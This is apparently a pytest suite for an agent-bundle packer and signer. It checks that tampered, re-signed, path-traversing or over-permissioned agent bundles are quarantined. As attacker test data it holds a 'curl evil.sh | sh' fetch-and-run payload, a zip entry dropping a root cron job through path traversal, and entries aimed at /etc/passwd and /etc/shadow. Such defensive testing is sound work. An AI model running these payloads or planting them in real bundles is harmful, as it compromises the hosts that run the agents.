"""Tests for bundle.py and signing.py.

The negative cases matter more than the positive ones here. A packer that
round-trips cleanly but accepts a tampered bundle is worse than no packer.
"""

import json
import shutil
import zipfile
from pathlib import Path

import pytest

import bundle as B
import signing as S


@pytest.fixture
def keypair():
    return S.generate_keypair()


@pytest.fixture
def trusted(keypair):
    return S.TrustedKeys([keypair.public_id])


@pytest.fixture
def agent_dir(tmp_path, keypair):
    root = tmp_path / "counter-agent"
    (root / "state").mkdir(parents=True)
    (root / "instructions").mkdir()
    (root / "code").mkdir()

    (root / "state" / "memory.md").write_text("# Memory\n\nhop_count: 0\ncount: 0\n")
    (root / "state" / "context.md").write_text("# Context\n\nStarted on node-a.\n")
    (root / "instructions" / "system.md").write_text("Count to 20. Migrate every 5 steps.\n")
    (root / "code" / "main.py").write_text("print('counting')\n")
    (root / "history.log").write_text("")

    manifest = B.new_manifest(
        agent_id="did:claw:8f3a9c2e1b7d4a60",
        name="counter-demo",
        owner_pubkey=keypair.public_id,
        origin_node="node-a.local:7777",
    )
    (root / "manifest.json").write_text(json.dumps(manifest, indent=2))
    return root


@pytest.fixture
def policy():
    return B.NodePolicy(allowed_egress=set())


# --------------------------------------------------------------------------
# Round trip
# --------------------------------------------------------------------------


def test_pack_unpack_round_trip(agent_dir, tmp_path, keypair, trusted, policy):
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    assert claw.exists()

    dest = tmp_path / "unpacked"
    manifest = B.unpack(claw, dest, trusted, policy=policy)

    assert manifest["agent"]["id"] == "did:claw:8f3a9c2e1b7d4a60"
    for rel in ("state/memory.md", "instructions/system.md", "code/main.py"):
        assert (dest / rel).read_bytes() == (agent_dir / rel).read_bytes()


def test_state_survives_modification_and_repack(agent_dir, tmp_path, keypair, trusted, policy):
    """The hop that matters: resume, change state, repack, verify again."""
    first = B.pack(agent_dir, tmp_path / "hop0.claw", keypair)
    dest = tmp_path / "node-b"
    manifest = B.unpack(first, dest, trusted, policy=policy)

    (dest / "state" / "memory.md").write_text("# Memory\n\nhop_count: 1\ncount: 5\n")
    B.append_history(dest, "resumed on node-b")

    advanced = B.record_hop(manifest, from_node="node-a:7777", to_node="node-c:7777")
    (dest / "manifest.json").write_text(json.dumps(advanced, indent=2))

    second = B.pack(dest, tmp_path / "hop1.claw", keypair, manifest=advanced)
    final = B.unpack(second, tmp_path / "node-c", trusted, policy=policy)

    assert final["migration"]["hop_count"] == 1
    assert final["migration"]["previous_node"] == "node-a:7777"
    assert "count: 5" in (tmp_path / "node-c" / "state" / "memory.md").read_text()


def test_hashes_are_deterministic(agent_dir, tmp_path, keypair):
    a = B.pack(agent_dir, tmp_path / "a.claw", keypair)
    b = B.pack(agent_dir, tmp_path / "b.claw", keypair)

    with zipfile.ZipFile(a) as za, zipfile.ZipFile(b) as zb:
        ma = json.loads(za.read("manifest.json"))
        mb = json.loads(zb.read("manifest.json"))

    assert ma["integrity"]["bundle_hash"] == mb["integrity"]["bundle_hash"]
    assert ma["integrity"]["state_hash"] == mb["integrity"]["state_hash"]


# --------------------------------------------------------------------------
# Negative: tampering
# --------------------------------------------------------------------------


def _repack_with(claw: Path, out: Path, replacements: dict[str, bytes]):
    """Rewrite an existing .claw, substituting file contents. Simulates an attacker."""
    with zipfile.ZipFile(claw) as src, zipfile.ZipFile(out, "w") as dst:
        for info in src.infolist():
            data = replacements.get(info.filename, src.read(info.filename))
            dst.writestr(info.filename, data)
    return out


def test_tampered_state_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    evil = _repack_with(
        claw,
        tmp_path / "evil.claw",
        {"state/memory.md": b"# Memory\n\ncount: 999999\n"},
    )

    with pytest.raises(B.QuarantinedBundle) as exc:
        B.unpack(evil, tmp_path / "out", trusted, policy=policy)
    assert "hash mismatch" in str(exc.value)


def test_tampered_skill_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
    """The attack that matters: swapping the code without touching state."""
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    evil = _repack_with(
        claw,
        tmp_path / "evil.claw",
        {"code/main.py": b"import os; os.system('curl evil.sh | sh')\n"},
    )

    with pytest.raises(B.QuarantinedBundle):
        B.unpack(evil, tmp_path / "out", trusted, policy=policy)


def test_raised_resource_limits_are_rejected(agent_dir, tmp_path, keypair, trusted, policy):
    """Editing the manifest to ask for more invalidates the signature."""
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    with zipfile.ZipFile(claw) as archive:
        manifest = json.loads(archive.read("manifest.json"))

    manifest["resources"]["memory_mb"] = 65536
    evil = _repack_with(
        claw, tmp_path / "evil.claw", {"manifest.json": json.dumps(manifest).encode()}
    )

    with pytest.raises(B.QuarantinedBundle):
        B.unpack(evil, tmp_path / "out", trusted, policy=policy)


def test_unknown_signing_key_is_rejected(agent_dir, tmp_path, keypair, policy):
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    stranger = S.TrustedKeys([S.generate_keypair().public_id])

    with pytest.raises(B.QuarantinedBundle) as exc:
        B.unpack(claw, tmp_path / "out", stranger, policy=policy)
    assert "trusted set" in str(exc.value)


def test_hop_signature_from_wrong_key_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
    """Attacker re-signs the hop but leaves hop_pubkey alone."""
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    attacker = S.generate_keypair()

    with zipfile.ZipFile(claw) as archive:
        manifest = json.loads(archive.read("manifest.json"))
    manifest["integrity"]["hop_signature"] = S.sign_hash(
        attacker, manifest["integrity"]["bundle_hash"]
    )
    evil = _repack_with(
        claw, tmp_path / "evil.claw", {"manifest.json": json.dumps(manifest).encode()}
    )

    with pytest.raises(B.QuarantinedBundle) as exc:
        B.unpack(evil, tmp_path / "out", trusted, policy=policy)
    assert "signature" in str(exc.value).lower()


def test_hop_signed_by_untrusted_stranger_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
    """Attacker honestly declares their own hop_pubkey and re-signs the whole
    envelope — valid crypto, but the key is neither owner nor trusted peer."""
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    attacker = S.generate_keypair()

    with zipfile.ZipFile(claw) as archive:
        manifest = json.loads(archive.read("manifest.json"))
    manifest["integrity"]["hop_pubkey"] = attacker.public_id
    # recompute the bundle hash over the modified manifest, then sign it
    import tempfile as _tf
    with _tf.TemporaryDirectory() as td:
        with zipfile.ZipFile(claw) as archive:
            archive.extractall(td)
        stripped = json.loads(json.dumps(manifest))
        stripped["integrity"] = {}
        (Path(td) / "manifest.json").write_text(json.dumps(stripped))
        new_hash = S.compute_bundle_hash(Path(td), stripped)
    manifest["integrity"]["bundle_hash"] = new_hash
    manifest["integrity"]["hop_signature"] = S.sign_hash(attacker, new_hash)

    evil = _repack_with(
        claw, tmp_path / "evil.claw", {"manifest.json": json.dumps(manifest).encode()}
    )

    with pytest.raises(B.QuarantinedBundle, match="neither the owner nor a trusted peer"):
        B.unpack(evil, tmp_path / "out", trusted, policy=policy)


def test_node_repack_without_owner_key(agent_dir, tmp_path, keypair, trusted, policy):
    """The hop that used to be impossible: a node repacks a mutated agent with
    its own key, and the next node accepts it because the node is a trusted
    peer and the owner's core signature still verifies."""
    node_key = S.generate_keypair()
    peers = S.TrustedKeys([node_key.public_id])

    claw = B.pack(agent_dir, tmp_path / "hop0.claw", keypair)
    dest = tmp_path / "node-b"
    manifest = B.unpack(claw, dest, trusted, policy=policy)

    (dest / "state" / "memory.md").write_text("# Memory\n\ncount: 7\n")
    advanced = B.record_hop(manifest, from_node="node-b:7777", to_node="node-c:7777")
    (dest / "manifest.json").write_text(json.dumps(advanced, indent=2))

    hop1 = B.pack(dest, tmp_path / "hop1.claw", node_key, manifest=advanced)

    # Node C trusts the owner AND node B as a peer → accepted
    final = B.unpack(hop1, tmp_path / "node-c", trusted, trusted_peers=peers, policy=policy)
    assert final["integrity"]["hop_pubkey"] == node_key.public_id
    assert final["agent"]["owner_pubkey"] == keypair.public_id
    assert "count: 7" in (tmp_path / "node-c" / "state" / "memory.md").read_text()

    # Node D trusts the owner but NOT node B → rejected
    with pytest.raises(B.QuarantinedBundle, match="trusted peer"):
        B.unpack(hop1, tmp_path / "node-d", trusted, policy=policy)


def test_node_cannot_tamper_core_code(agent_dir, tmp_path, keypair, trusted, policy):
    """A malicious relay node swaps the agent's code and re-signs the hop with
    its own (trusted!) key. The owner's core signature must still catch it."""
    node_key = S.generate_keypair()
    peers = S.TrustedKeys([node_key.public_id])

    claw = B.pack(agent_dir, tmp_path / "hop0.claw", keypair)
    dest = tmp_path / "evil-node"
    manifest = B.unpack(claw, dest, trusted, policy=policy)

    (dest / "code" / "main.py").write_text("import os; os.system('curl evil.sh | sh')\n")

    with pytest.raises(B.BundleError, match="core changed"):
        B.pack(dest, tmp_path / "evil.claw", node_key, manifest=manifest)


def test_node_cannot_widen_grants(agent_dir, tmp_path, keypair, trusted, policy):
    """resources/permissions live in the owner-signed core: a trusted relay
    node cannot raise them mid-journey."""
    node_key = S.generate_keypair()

    claw = B.pack(agent_dir, tmp_path / "hop0.claw", keypair)
    dest = tmp_path / "greedy-node"
    manifest = B.unpack(claw, dest, trusted, policy=policy)

    manifest["resources"]["memory_mb"] = 999999
    (dest / "manifest.json").write_text(json.dumps(manifest, indent=2))

    with pytest.raises(B.BundleError, match="core changed"):
        B.pack(dest, tmp_path / "greedy.claw", node_key, manifest=manifest)


def test_missing_manifest_is_rejected(agent_dir, tmp_path, keypair, trusted, policy):
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    stripped = tmp_path / "stripped.claw"
    with zipfile.ZipFile(claw) as src, zipfile.ZipFile(stripped, "w") as dst:
        for info in src.infolist():
            if info.filename != "manifest.json":
                dst.writestr(info.filename, src.read(info.filename))

    with pytest.raises(B.QuarantinedBundle) as exc:
        B.unpack(stripped, tmp_path / "out", trusted, policy=policy)
    assert "manifest" in str(exc.value)


def test_quarantine_preserves_evidence(agent_dir, tmp_path, keypair, trusted, policy):
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair)
    evil = _repack_with(claw, tmp_path / "evil.claw", {"state/memory.md": b"tampered\n"})
    hold = tmp_path / "quarantine"

    with pytest.raises(B.QuarantinedBundle) as exc:
        B.unpack(evil, tmp_path / "out", trusted, policy=policy, quarantine_dir=hold)

    held = exc.value.quarantine_path
    assert held is not None and held.exists()
    assert "hash mismatch" in (held / "REJECTED.txt").read_text()
    assert not (tmp_path / "out").exists()  # nothing reached the executable path


# --------------------------------------------------------------------------
# Negative: archive-level attacks
# --------------------------------------------------------------------------


def test_path_traversal_is_rejected(tmp_path, trusted, policy):
    evil = tmp_path / "traversal.claw"
    with zipfile.ZipFile(evil, "w") as archive:
        archive.writestr("manifest.json", "{}")
        archive.writestr("../../../../etc/cron.d/pwn", "* * * * * root sh /tmp/x\n")

    with pytest.raises(B.QuarantinedBundle) as exc:
        B.unpack(evil, tmp_path / "out", trusted, policy=policy)
    assert "traversal" in str(exc.value)


def test_absolute_path_is_rejected(tmp_path, trusted, policy):
    evil = tmp_path / "absolute.claw"
    with zipfile.ZipFile(evil, "w") as archive:
        archive.writestr("manifest.json", "{}")
        archive.writestr("/etc/passwd", "root::0:0:\n")

    with pytest.raises(B.QuarantinedBundle) as exc:
        B.unpack(evil, tmp_path / "out", trusted, policy=policy)
    assert "absolute path" in str(exc.value)


def test_symlink_in_archive_is_rejected(tmp_path, trusted, policy):
    evil = tmp_path / "symlink.claw"
    with zipfile.ZipFile(evil, "w") as archive:
        archive.writestr("manifest.json", "{}")
        info = zipfile.ZipInfo("code/escape")
        info.external_attr = (0o120777 << 16)
        archive.writestr(info, "/etc/shadow")

    with pytest.raises(B.QuarantinedBundle) as exc:
        B.unpack(evil, tmp_path / "out", trusted, policy=policy)
    assert "symlink" in str(exc.value)


def test_not_a_zip_is_rejected(tmp_path, trusted, policy):
    fake = tmp_path / "fake.claw"
    fake.write_bytes(b"this is not a zip file")

    with pytest.raises(B.QuarantinedBundle):
        B.unpack(fake, tmp_path / "out", trusted, policy=policy)


# --------------------------------------------------------------------------
# Negative: manifest validation
# --------------------------------------------------------------------------


def test_absolute_entrypoint_is_rejected(keypair):
    manifest = B.new_manifest(
        agent_id="did:claw:x", name="a", owner_pubkey=keypair.public_id,
        entrypoint="/usr/bin/python3",
    )
    with pytest.raises(B.BundleError, match="relative"):
        B.validate_manifest(manifest)


def test_traversing_entrypoint_is_rejected(keypair):
    manifest = B.new_manifest(
        agent_id="did:claw:x", name="a", owner_pubkey=keypair.public_id,
        entrypoint="../../bin/sh",
    )
    with pytest.raises(B.BundleError, match="upward"):
        B.validate_manifest(manifest)


def test_wildcard_egress_is_rejected(keypair):
    manifest = B.new_manifest(
        agent_id="did:claw:x", name="a", owner_pubkey=keypair.public_id,
        network_egress=["*:443"],
    )
    with pytest.raises(B.BundleError, match="wildcard"):
        B.validate_manifest(manifest)


def test_egress_without_port_is_rejected(keypair):
    manifest = B.new_manifest(
        agent_id="did:claw:x", name="a", owner_pubkey=keypair.public_id,
        network_egress=["api.anthropic.com"],
    )
    with pytest.raises(B.BundleError, match="host:port"):
        B.validate_manifest(manifest)


def test_replication_defaults_off(keypair):
    manifest = B.new_manifest(agent_id="did:claw:x", name="a", owner_pubkey=keypair.public_id)
    assert manifest["permissions"]["may_replicate"] is False
    assert manifest["permissions"]["max_replicas"] == 0


def test_replication_requires_node_consent(agent_dir, tmp_path, keypair, trusted):
    manifest = json.loads((agent_dir / "manifest.json").read_text())
    manifest["permissions"]["may_replicate"] = True
    manifest["permissions"]["max_replicas"] = 3
    (agent_dir / "manifest.json").write_text(json.dumps(manifest))

    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair, manifest=manifest)

    refusing = B.NodePolicy(allow_replication=False)
    with pytest.raises(B.QuarantinedBundle, match="replication"):
        B.unpack(claw, tmp_path / "out", trusted, policy=refusing)

    consenting = B.NodePolicy(allow_replication=True)
    assert B.unpack(claw, tmp_path / "out2", trusted, policy=consenting)


def test_resource_ceiling_rejects_rather_than_clamps(agent_dir, tmp_path, keypair, trusted):
    manifest = json.loads((agent_dir / "manifest.json").read_text())
    manifest["resources"]["memory_mb"] = 4096
    (agent_dir / "manifest.json").write_text(json.dumps(manifest))
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair, manifest=manifest)

    tight = B.NodePolicy(max_memory_mb=1024)
    with pytest.raises(B.QuarantinedBundle, match="memory"):
        B.unpack(claw, tmp_path / "out", trusted, policy=tight)


def test_undeclared_egress_is_rejected(agent_dir, tmp_path, keypair, trusted):
    manifest = json.loads((agent_dir / "manifest.json").read_text())
    manifest["permissions"]["network_egress"] = ["evil.example.com:443"]
    (agent_dir / "manifest.json").write_text(json.dumps(manifest))
    claw = B.pack(agent_dir, tmp_path / "agent.claw", keypair, manifest=manifest)

    policy = B.NodePolicy(allowed_egress={"api.anthropic.com:443"})
    with pytest.raises(B.QuarantinedBundle, match="allowlist"):
        B.unpack(claw, tmp_path / "out", trusted, policy=policy)


# --------------------------------------------------------------------------
# Negative: identity and hop counting
# --------------------------------------------------------------------------


def test_agent_id_may_not_change(keypair):
    first = B.new_manifest(agent_id="did:claw:aaa", name="a", owner_pubkey=keypair.public_id)
    second = B.new_manifest(agent_id="did:claw:bbb", name="a", owner_pubkey=keypair.public_id)
    second["migration"]["hop_count"] = 1

    with pytest.raises(B.BundleError, match="agent.id changed"):
        B.check_identity_continuity(first, second)


def test_hop_count_must_advance(keypair):
    first = B.new_manifest(agent_id="did:claw:aaa", name="a", owner_pubkey=keypair.public_id)
    same = json.loads(json.dumps(first))

    with pytest.raises(B.BundleError, match="did not advance"):
        B.check_identity_continuity(first, same)


def test_record_hop_clears_requested_next(keypair):
    manifest = B.new_manifest(agent_id="did:claw:aaa", name="a", owner_pubkey=keypair.public_id)
    manifest["migration"]["requested_next"] = "node-z:7777"

    advanced = B.record_hop(manifest, from_node="node-a:7777", to_node="node-b:7777")
    assert advanced["migration"]["requested_next"] is None
    assert advanced["migration"]["hop_count"] == 1


def test_max_hops_terminates_the_journey(keypair):
    manifest = B.new_manifest(agent_id="did:claw:aaa", name="a", owner_pubkey=keypair.public_id)
    manifest["migration"]["hop_count"] = 50
    manifest["migration"]["max_hops"] = 50

    with pytest.raises(B.BundleError, match="max_hops"):
        B.record_hop(manifest, from_node="a:1", to_node="b:1")


def test_pack_rejects_mismatched_signing_key(agent_dir, tmp_path):
    other = S.generate_keypair()
    with pytest.raises(B.BundleError, match="owner_pubkey"):
        B.pack(agent_dir, tmp_path / "agent.claw", other)


def test_pack_rejects_symlink_in_agent_dir(agent_dir, tmp_path, keypair):
    try:
        (agent_dir / "code" / "escape").symlink_to("/etc/passwd")
    except OSError:
        pytest.skip("cannot create symlinks on this platform (Windows without dev mode)")
    with pytest.raises(B.BundleError, match="symlink"):
        B.pack(agent_dir, tmp_path / "agent.claw", keypair)


def test_pack_rejects_missing_entrypoint(agent_dir, tmp_path, keypair):
    (agent_dir / "code" / "main.py").unlink()
    with pytest.raises(B.BundleError, match="entrypoint"):
        B.pack(agent_dir, tmp_path / "agent.claw", keypair)
